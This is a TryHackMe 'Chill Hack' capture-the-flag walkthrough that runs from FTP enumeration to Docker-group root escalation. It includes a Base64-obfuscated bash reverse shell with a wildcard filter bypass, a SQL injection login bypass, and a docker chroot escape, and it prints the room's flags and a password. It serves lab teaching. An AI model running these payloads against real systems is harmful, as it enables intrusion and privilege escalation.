# 🛡️ TryHackMe – Chill Hack - Writeup

## 📌 Overview
**Room Name:** Chill Hack  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Exploitation / SQLi / Steganography / Privilege Escalation

Linux machine with a command injection entry point and a multi-stage escalation chain ending with Docker group abuse.

The attack chain involves:

- Anonymous FTP access revealing filter information
- Command injection on `/secret` via Base64 encoding and wildcard bypass
- Input injection in a sudo-allowed script for lateral movement to `apaar`
- SSH tunneling to reach an internal service vulnerable to SQL injection
- Steganography and hash cracking for lateral movement to `anurodh`
- Docker group exploitation for root access

---

## 🔍 1. Enumeration

### 🔎 Port Scanning
An initial scan using `nmap` revealed the following open ports:

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### 📂 FTP & Web Enumeration
Anonymous FTP login was allowed. Retrieved `note.txt`, which hinted at a blacklist filter on the `/secret` directory.

Using `gobuster` for directory discovery:

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

Discovered `/secret` — a page containing an input form that executes system commands directly.

---

## 🔓 2. Initial Access

### ⚙️ Filter Bypass & Reverse Shell
The form on `/secret` had a blacklist preventing direct commands like `ls` or `/bin/bash`. Bypassed using **Base64 encoding** and **shell wildcards**:

Started a netcat listener:

```bash
nc -lvnp 4444
```

Submitted the following payload:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1MC4yMDMvNDQ0NCAwPiYxCg== | base64 -d | /?in/ba?h
```

The command was Base64-decoded and piped into `/?in/ba?h` (wildcard for `/bin/bash`), bypassing string-based filters.

**Reverse shell as `www-data` obtained.** ✅

---

## 🚀 3. Lateral Movement: www-data → apaar

### 🔍 Sudo Misconfiguration
Checking sudo permissions:

```bash
sudo -l
```

`www-data` could run `/home/apaar/.helpline.sh` as `apaar` without a password.

The script took user input and executed it directly as a command. Injecting `/bin/bash -i` at the message prompt escalated to `apaar`.

**User Flag:** `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}`

---

## 🚀 4. Lateral Movement: apaar → anurodh

### 🔑 SSH Stabilization
Added Kali public key to `apaar`'s `authorized_keys` for stable SSH access.

### 🌐 SSH Tunneling & SQL Injection
`ss -ntlp` revealed an internal service on `127.0.0.1:9001`. Forwarded it via SSH:

```bash
ssh -L 9001:127.0.0.1:9001 apaar@<target_ip>
```

The internal **Customer Portal** login was vulnerable to SQLi. Bypassed authentication with:

```sql
' OR 1=1 #
```

### 🖼️ Steganography & Hash Cracking
The authenticated page hinted: *"Look in the dark!"*

Used `steghide` on the page image to extract an embedded `backup.zip`. Cracked the zip password with `john the ripper`, then decoded a Base64 password inside `source_code.php`:

**Credentials for `anurodh`:** `!d0ntKn0wmYp@ssw0rd`

---

## 👑 5. Privilege Escalation: anurodh → root

### 🐳 Docker Group Exploitation
`id` showed `anurodh` was a member of the `docker` group (GID: 999).

Docker group membership is equivalent to root access — users can mount the host's root filesystem into a container:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Mounted host `/` to `/mnt` and used `chroot` to gain a full root shell.

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

### 👑 Root Flag

```
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

---

## 📚 Key Takeaways

- ⚙️ **Filter Bypass via Encoding:** Blacklist-based filters can often be bypassed with Base64 encoding and shell wildcards. Whitelist-based filtering is far more robust.
- 🛠️ **Input Injection in Shell Scripts:** Passing unsanitized user input directly to a shell variable is equivalent to giving the user a shell.
- 🌐 **SSH Tunneling for Internal Services:** Internal services not exposed externally can still be reached by an attacker with a foothold via port forwarding.
- 💉 **SQLi on Internal Apps:** Internal admin portals often receive less security scrutiny than public-facing ones, making them prime targets.
- 🐳 **Docker Group = Root:** Membership in the Docker group should be treated the same as sudo access. It allows full host filesystem access via container mounts.

---

## 🛠️ Tools Used

- `nmap`
- `gobuster`
- `nc` (netcat)
- `ssh`, `ssh -L` (port forwarding)
- `steghide`
- `john`
- `docker`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
